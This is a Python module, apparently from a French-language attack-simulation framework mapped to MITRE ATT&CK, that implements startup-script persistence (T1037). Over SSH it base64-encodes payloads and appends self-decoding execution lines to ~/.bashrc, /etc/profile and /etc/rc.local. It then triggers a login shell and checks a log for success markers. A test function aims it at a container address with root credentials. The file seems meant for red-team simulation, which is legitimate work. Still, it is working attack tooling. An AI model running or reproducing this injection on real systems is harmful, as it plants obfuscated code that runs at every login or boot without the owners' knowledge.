#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri May 15 17:49:47 2026

@author: hounsousamuel

StartupScript — MITRE T1037
Injection dans les scripts de démarrage pour persistance au boot/login.
"""

import os
import sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))

import time
import base64
import asyncio
from typing import Dict, Any, Optional, List

from tactics.execution.command_execution import CommandExecution
from tactics.persistence.data.startup_helper import (
    get_target_path, PAYLOADS, STARTUP_LOG_FILE, 
    STARTUP_TARGETS, LEVEL_PAYLOADS
)
from tactics.mittres import MITRE
from simulateur_utils.logger import get_logger

logger = get_logger()


class StartupScript(CommandExecution):
    """
    Persistance via scripts de démarrage (MITRE T1037).

    Injecte des payloads dans les scripts exécutés au boot ou login :
        - ~/.bashrc, ~/.bash_profile (user)
        - /etc/profile, /etc/rc.local (system)
    """

    def __init__(
        self,
        name: str = "startup_script",
        timeout: int = 2,
        exec_timeout: int = 10,
        **kwargs
    ):
        """
        Initialise le StartupScript.

        Args:
            name (str): Nom de l'instance. Par défaut "startup_script".
            timeout (int): Timeout de connexion SSH en secondes.
            exec_timeout (int): Timeout d'exécution des commandes en secondes.
            **kwargs: Arguments supplémentaires transmis à CommandExecution.
        """
        super().__init__(name=name, timeout=timeout, exec_timeout=exec_timeout, **kwargs)
        self.startup_result: List[Dict] = []
        self._output: str = ""

    async def check_success_async(
        self,
        ip: str,
        port: int,
        username: str,
        password: str,
        markers: List[str],
        log_file: str = STARTUP_LOG_FILE,
        store_output: bool = True,
        use_output: bool = True,
        pkey=None
    ) -> bool:
        """
        Vérifie si les marqueurs sont présents dans les logs.

        Args:
            ip (str): IP de la cible.
            port (int): Port SSH.
            username (str): Nom d'utilisateur.
            password (str): Mot de passe.
            markers (List[str]): Liste des marqueurs à rechercher.
            log_file (str): Chemin du fichier de log.
            store_output (bool): Stocker la sortie dans self._output.
            use_output (bool): Utiliser la sortie déjà stockée.

        Returns:
            bool: True si au moins un marqueur est trouvé.
        """
        try:
            if use_output and self._output:
                output = self._output
            else:
                cmd = f"echo '' >> {log_file} && cat {log_file}"
                exec_result = await self.exec_command_async(
                    ip=ip,
                    port=port,
                    username=username,
                    password=password,
                    commands=[cmd],
                    pkey=pkey
                )
                if exec_result["results"].get("success_number", 0) == 1 and exec_result["results"].get("success_rate", 0) == 1:
                    output = str(exec_result["results"]["commands"][cmd]["stdout"]).strip()
                else:
                    self.log("Échec lecture fichier de log", log=True)
                    return False

            if not output:
                self.log("Fichier de log vide", log=True)
                return False

            if store_output:
                self._output = output

            found = any(marker in output for marker in markers)
            if found:
                self.log(f"✅ Marqueurs trouvés: {markers}", log=True)
            else:
                self.log(f"❌ Aucun marqueur trouvé: {markers}", log=True)

            return found

        except Exception as e:
            self.log(f"Erreur check_success: {e}", log=True)
            return False

    async def install_startup_persistence_async(
        self,
        ip: str,
        port: int,
        username: str,
        password: str,
        pkey=None
    ) -> Dict[str, Any]:
        """
        Installe la persistance via scripts de démarrage.

        Injecte tous les payloads dans toutes les cibles.

        Args:
            ip (str): IP de la cible.
            port (int): Port SSH.
            username (str): Nom d'utilisateur.
            password (str): Mot de passe.

        Returns:
            Dict[str, Any]: Résultat formaté.
        """
        self.log(f"Début StartupScript injection sur {username}@{ip}:{port}", log=True)
        self.start_time = time.time()

        try:
            commands = []
            markers = {}
            for name, payload in PAYLOADS.items():
                code = payload["code"]
                markers[name] = payload["markers"]
                encoded = base64.b64encode(code.encode()).decode()
                base = name.split("_")[0]
                inject_code = f"""echo '{encoded}' | base64 -d - | {base}"""
                for target, _target_dict in STARTUP_TARGETS.items():
                    path = get_target_path(target)
                    
                    commands.append((name, target, inject_code, f"""test -f {path} && echo "{inject_code}" >> {path}"""))

            self.log(f"Exécution de {len(commands)} injections", log=True)

            exec_result = await self.exec_command_async(
                ip=ip,
                port=port,
                username=username,
                password=password,
                commands=[cmd[-1] for cmd in commands],
                pkey=pkey
            )

            await self.exec_command_async(
                ip=ip,
                port=port,
                username=username,
                password=password,
                commands=["bash -i -c 'exit'"],
                pkey=pkey
            )
            await asyncio.sleep(5)
            if exec_result["results"].get("success_number", 0) > 0:
                for name, target, inject_code, cmd in commands:
                    cmd_result = exec_result["results"]["commands"].get(cmd, {})
                    success = await self.check_success_async(
                        ip=ip,
                        port=port,
                        username=username,
                        password=password,
                        markers=markers[name],
                        use_output=True,
                        store_output=True,
                        log_file=STARTUP_LOG_FILE,
                        pkey=pkey
                    )
                    self.startup_result.append({
                        "payload": name,
                        "target": target,
                        "path": get_target_path(target),
                        "cmd": cmd,
                        "inject_code": inject_code,
                        "success": success,
                        "exec_result": cmd_result,
                        "markers": markers[name]
                    })

                    if success:
                        self.log(f"✅ Injection réussie: {name} → {target}", log=True)
                    else:
                        self.log(f"❌ Injection échouée: {name} → {target}", log=True)

            self.end_time = time.time()
            self.log(f"Fin StartupScript — {sum(1 for r in self.startup_result if r['success'])} succès", log=True)

        except Exception as e:
            self.log(f"Erreur dans install_startup_persistence: {e}", log=True)
            self.end_time = time.time()

        return self.get_startup_result()

    def install_startup_persistence_sync(self, *args, **kwargs) -> Dict[str, Any]:
        """Version synchrone de install_startup_persistence_async."""
        return asyncio.run(self.install_startup_persistence_async(*args, **kwargs))

    def get_startup_result(self) -> Dict[str, Any]:
        """
        Génère le résultat formaté de la persistance startup.

        Returns:
            Dict[str, Any]: Résultat formaté contenant :
                - severity (str): Niveau de sévérité ("HIGH" ou "LOW")
                - elapsed (float): Temps écoulé en secondes
                - mitres (List): Références MITRE ATT&CK
                - results (Dict): Détails des injections
        """
        self.save()

        mitres = [MITRE.get("StartupScript", {})]

        success_count = sum(1 for r in self.startup_result if r.get("success"))

        return {
            'severity': 'HIGH' if success_count > 0 else 'LOW',
            'elapsed': self.end_time - self.start_time if self.end_time and self.start_time else 0,
            "mitres": mitres,
            'results': {
                "injections": self.startup_result,
                "success_number": success_count,
                "success_rate": success_count / max(1, len(self.startup_result)),
            },
        }


# =============================================================================
# Fonction de test
# =============================================================================

def test_startup_script(
    ip: str = "172.17.0.2",
    port: int = 22,
    username: str = "root",
    password: str = "toor",
    pkey=None
):
    """
    Teste la classe StartupScript sur une cible.

    Args:
        ip (str): IP de la cible.
        port (int): Port SSH.
        username (str): Nom d'utilisateur.
        password (str): Mot de passe.
    """
    print(f"\n🚀 Test StartupScript sur {username}@{ip}:{port}")
    print("-" * 50)

    startup = StartupScript(timeout=5, exec_timeout=10)

    result = startup.install_startup_persistence_sync(
        ip=ip,
        port=port,
        username=username,
        password=password,
        pkey=pkey
    )

    severity = result.get("severity", "UNKNOWN")
    elapsed = result.get("elapsed", 0)
    results = result.get("results", {})
    success_number = results.get("success_number", 0)
    injections = results.get("injections", [])

    severity_icon = {"HIGH": "🔴", "MEDIUM": "🟡", "LOW": "🟢"}.get(severity, "⚪")

    print(f"\n{severity_icon} Sévérité : {severity}")
    print(f"⏱️  Temps : {elapsed:.2f}s")
    print(f"📊 Injections réussies : {success_number}/{len(injections)}")

    for inj in injections:
        status = "✅" if inj.get("success") else "❌"
        print(f"   {status} {inj.get('payload')} → {inj.get('target')} ({inj.get('path')})")

    return result, startup


if __name__ == "__main__":
    test_startup_script()